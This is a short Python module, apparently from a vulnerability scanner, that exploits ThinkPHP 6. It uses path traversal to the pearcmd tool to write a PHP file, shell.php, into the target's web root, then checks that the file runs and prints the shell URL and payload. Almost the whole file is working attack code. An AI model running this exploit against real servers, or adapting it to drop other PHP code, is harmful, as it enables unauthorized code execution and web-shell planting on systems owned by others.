#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet
import urllib3
urllib3.disable_warnings()


class ThinkPhpV6:
    def poc(self, target):
        url = target + "/public/index.php?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php"

        url1 = target + "/shell.php"
        try:
            res1 = requests.get(url1, headers=self.headers, verify=self.verify, proxies=self.proxy, timeout=5).text
            res = requests.get(url, headers=self.headers, verify=self.verify, proxies=self.proxy, timeout=5).text
            if " pear.php.net" in res:
                if "phpinfo()" in res1:
                    OutPrintInfo("ThinkPHP", f"[b bright_red]{target}[/b bright_red] is valueable")
                    OutPrintInfo("ThinkPHP", f"SHELL-URL[b bright_red]{url1}[/b bright_red]")
                    OutPrintInfo("ThinkPHP", f"PAYLOAD[b bright_red]{url}[/b bright_red]")
            else:
                OutPrintInfo("ThinkPHP", f"{target} is not valueable")
        except:
            OutPrintInfo("ThinkPHP", f"{target} Error")

    def main(self, target):
        url = target[0].strip('/ ')
        reqset = ReqSet(header=target[1],proxy=target[2])
        self.headers = reqset["header"]
        self.proxy = reqset["proxy"]
        self.verify = target[3]
        self.poc(url)